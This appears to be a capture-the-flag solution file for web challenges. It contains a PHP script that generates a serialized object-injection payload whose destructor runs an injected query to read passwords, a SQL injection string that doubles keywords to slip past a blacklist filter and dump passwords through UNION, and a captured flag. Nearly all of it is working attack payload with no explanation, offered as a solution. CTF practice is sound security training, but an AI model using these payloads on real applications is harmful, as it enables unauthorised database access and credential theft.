<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}


$sql = new SQL();
$sql->query = "SELECT password as username FROM users WHERE id=1;";
echo base64_encode(serialize($sql));
echo "\n";
echo serialize($sql);

?>


SELECT id,username FROM users WHERE id=999 UNIOUNIONN SELECSELECTT null,passwoorrd FRFROMOM users; --

WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}


SELECT id,login FROM users WHERE id=